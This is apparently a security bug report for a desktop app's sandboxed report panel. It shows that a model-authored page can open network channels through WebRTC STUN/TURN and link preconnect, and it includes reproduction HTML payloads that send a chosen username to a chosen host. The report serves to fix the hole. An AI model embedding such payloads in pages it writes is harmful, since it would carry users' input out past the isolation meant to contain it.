> Severity: Major

# A report page can reach the network through WebRTC and `<link rel=preconnect>`

## Symptom

A page pushed to the hub's report panel can open network traffic to a host and port of its own choosing through
`RTCPeerConnection` (STUN/TURN over UDP) and through `<link rel="preconnect">` (a TCP connection), although the panel's
isolation is meant to leave `octoboard.submit` as the only way data leaves a page.

## Reproduction steps

1. Build the macOS application (`pnpm build:daemon && pnpm tauri build --bundles app` in `apps/desktop`) and launch
   `Octoboard.app/Contents/MacOS/octoboard` with a throwaway `HOME` and `TMPDIR`.
2. Start a listener on the loopback interface that logs both UDP datagrams and TCP accepts, e.g. UDP on port 34780 and
   TCP on port 34781.
3. Open a hub session and push a page to its report panel with the hub's `show_page` tool (through `POST /mcp/:token`
   with the hub's MCP token, so no model turn is needed) whose content is:

   ```html
   <!doctype html><html><body><script>
   var pc = new RTCPeerConnection({iceServers: [{urls: 'turn:127.0.0.1:34780?transport=udp',
     username: 'SECRET-USER-DATA', credential: 'x'}]});
   pc.createDataChannel('x');
   pc.createOffer().then(function (o) { return pc.setLocalDescription(o); });
   </script></body></html>
   ```

4. Observe the UDP listener: STUN Binding requests (message type `0x0001`) and TURN Allocate requests (`0x0003`) arrive
   from the application, repeating for several seconds.
5. Push a second page whose content is
   `<!doctype html><html><head><link rel="preconnect" href="http://127.0.0.1:34781"></head><body></body></html>`.
6. Observe the TCP listener: a connection from the application is accepted (no request data is sent on it).

## Expected vs. actual

- Expected: the page has no channel of its own for sending anything out; "The one way Octoboard provides for data to
  leave a page is `octoboard.submit`" (`docs/product/report-panel.md`, "What a page may contain, and what it cannot
  do", which lists these two routes as a known gap).
- Actual: the page makes the application send UDP to a destination it names (STUN/TURN), and open a TCP connection to
  one (preconnect).

## Environment

- macOS release build of the application, unsigned, built from the branch that switched the shell to `packages/ui`
  (WKWebView through Tauri 2 / wry).
- The report page is rendered in an iframe with `sandbox="allow-scripts"` and its own CSP meta tag
  (`default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; connect-src 'none';
  form-action 'none'; frame-src 'none'; base-uri 'none'`); the window's own CSP has `frame-src 'none'`.
- Observed against loopback listeners only.

## Scope of impact

Every user of the hub's report panel. A page is model-authored and its script runs over whatever the user types into
it, so a page could carry that input out in the destination host name or port it chooses. No workaround on the user's
side other than not using the report panel.

## Leads

- Verified: `fetch`, XHR, WebSocket, `sendBeacon`, external `<img>` and stylesheet loads, native form submission and
  navigating the frame to an external URL are all blocked in the same build; none of them reached the listener (which
  received a `curl` positive control).
- Verified: `RTCPeerConnection` exists in the page's frame.
- Verified: the TURN Allocate requests observed were the unauthenticated first requests (no username attribute).
  Inferred: against a TURN server that answers with an authentication challenge, the page-chosen `username` would be
  sent too, giving a further channel.
- Inferred: CSP has no directive that governs WebRTC or preconnect in WebKit, so the fix cannot come from the CSPs
  alone. WKWebView has no public setting to disable WebRTC and wry does not expose one.
- Inferred: removing `RTCPeerConnection` from the page's global scope by script would be bypassable through a child
  `about:blank` frame unless that is closed too.
- Not established: link-based DNS prefetching (`<link rel=dns-prefetch>`) — observing it needs DNS sniffing, which was
  not done.
- Inferred: the old React UI rendered the page with the same sandbox and CSPs in the same webview, so this predates the
  switch to `packages/ui`.

## Acceptance criteria

- [ ] With the steps above, the UDP listener receives nothing from a page using `RTCPeerConnection` (including when the
      constructor is reached through a nested frame the page creates).
- [ ] With the steps above, the TCP listener accepts no connection from a page using `<link rel="preconnect">`
      (and `rel="prefetch"`, `rel="preload"`).
- [ ] Whether link-based DNS prefetching leaves the application is established by observation, and it does not.
- [ ] `octoboard.submit` from the newest page still reaches the hub, and all the channels listed as blocked under
      "Leads" stay blocked.
